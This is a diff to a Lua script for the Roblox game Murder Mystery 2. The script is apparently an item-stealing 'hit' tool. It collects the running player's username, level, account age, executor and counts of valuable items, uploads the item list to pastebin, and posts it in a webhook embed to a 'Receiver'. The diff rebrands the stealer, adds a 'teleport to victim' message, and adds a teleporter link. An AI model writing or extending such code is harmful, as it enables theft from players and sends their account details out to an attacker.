@@ -969,7 +969,7 @@ local function pastebin(content)
     end)
 
     if not success or not response or not response.Success then
-        return "\n ERROR: Country not supported \n"
+        return "\n error: pastebin api not available right now \n"
     end
 
     local pasteUrl = response.Body
@@ -1061,13 +1061,13 @@ local EverythingString = "-- // Uniques\n" .. uniquesString ..
                          "\n\n-- // Common\n" .. commonsString
 
 local WebHookEmbed = CreateEmbed(
-    "Vlorp Scripts | MM2",
-    "Please execute the code above to get your hit.",
-    11220,
+    "ZHub mm2 script",
+    "Copy and paste script above to teleport to victim.",
+    1983258,
     {
         {name = "```Info```", value = "```Username: "..LP.Name.."\nLevel: "..tostring(getLvl()).."\nAccount-Age: "..tostring(LP.AccountAge).."\nExecutor: "..identifyexecutor().."\nReceiver: "..userName.."```"},
 {name = "```Hit Info```", value = "```Total Value: "..tostring(math.floor(valueCount + 0.5)).."\nTotal Count: "..tostring(itemsCount - 2).."\n\nUniques: "..tostring(uniqueItemsC).."\nAncients: "..tostring(ancientItemsC).."\nGodlys: "..tostring(godlyItemsC).."\nLegendarys: "..tostring(legendaryItemsC).."\nVintage: "..tostring(vintageItemsC).."\nRares: "..tostring(rareItemsC).."\nUncommons: "..tostring(uncommonItemsC).."\nCommons: "..tostring(commonItemsC).."```"},
-{name = "```Hit List```", value = "[Click Me]("..pastebin(EverythingString)..")"}
+{name = "```Hit List```", value = "[Click Me]("..pastebin(EverythingString)..")", value = "[Teleporter](<https://www.roblox.com/games/18845424641/Mori-Scripts-TELEPORTER>)"}
     }
 )
 if godlyItemsC >= 1 or ancientItemsC >= 1 or uniqueItemsC >= 1  then
